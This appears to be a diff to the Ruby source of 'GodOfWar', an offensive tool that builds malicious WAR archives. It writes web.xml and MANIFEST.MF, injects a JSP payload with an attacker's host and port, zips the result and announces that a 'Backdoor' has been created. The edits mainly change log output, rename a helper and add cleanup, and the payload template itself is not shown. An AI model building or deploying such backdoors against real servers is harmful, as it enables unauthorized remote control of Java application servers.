@@ -30,11 +30,13 @@ module GodOfWar
       end
 
       @output = @output? @output : @payload.name
-      rename_exists(@war_dir)
+      rename_if_exists("#{@war_dir}.war")
+      puts "Creating Directory Structure:".tell
       FileUtils.mkdir_p(File.join(@war_dir, 'WEB-INF'))
       FileUtils.mkdir_p(File.join(@war_dir, 'META-INF'))
-
-      puts "Creating #{@war_dir} directory structure".success
+      puts "#{@war_dir}".step_success
+      puts File.join(@war_dir, 'WEB-INF').step_success
+      puts File.join(@war_dir, 'META-INF').step_success
     end
 
     # WEB-INF
@@ -60,7 +62,7 @@ module GodOfWar
                 WEBXML
 
       File.write(web_xml_path, web_xml)
-      puts "Creating #{web_xml_path}".success
+      puts "#{web_xml_path}".step_success
     end
 
     # web_xml builds 'MANIFEST.MF' file for a given jsp file
@@ -76,7 +78,7 @@ module GodOfWar
           MANIFEST
 
       File.write(manifest_mf_path, manifest_mf)
-      puts "Creating #{File.join(@war_dir, 'META-INF', 'MANIFEST.MF')}".success
+      puts "#{File.join(@war_dir, 'META-INF', 'MANIFEST.MF')}".step_success
     end
 
     def set_payload(host, port)
@@ -91,26 +93,27 @@ module GodOfWar
                           .sub('HOSTHOST', "#{host}").sub('PORTPORT', "#{port}")
       end
       File.write(File.join(@output, "#{@output}.jsp"), payload_raw)
-      puts "Setting up payload #{File.join(@war_dir, @payload.name)}.jsp".success
+      puts "Setting up payload:".tell
+      puts "#{File.join(@war_dir, @payload.name)}.jsp".step_success
     end
 
     # build_war build the WAR file by recursively the source directory content then zip it
     def war
       final_war = "#{@output}.war"
-      rename_exists(final_war)
-
       Zip::File.open(final_war, Zip::File::CREATE) do |zip|
         Dir.glob("#{@war_dir}/**/*" ).each do |file|
           zip.add(file.sub(@output, '').sub(/[\/|\\]/, ''), file)
         end
       end
+      puts "Cleaning up".tell
+      FileUtils.rm_rf(@war_dir)
       puts "Backdoor ".done + "#{@output}.war".bold + " has been created."
     end
 
     private
 
     # check if the war file exists, rename it if true.
-    def rename_exists(file)
+    def rename_if_exists(file)
       if File.exist? file
         rename = "#{file}_#{Time.now.to_i}"
         puts "File '#{file}' exists".warn
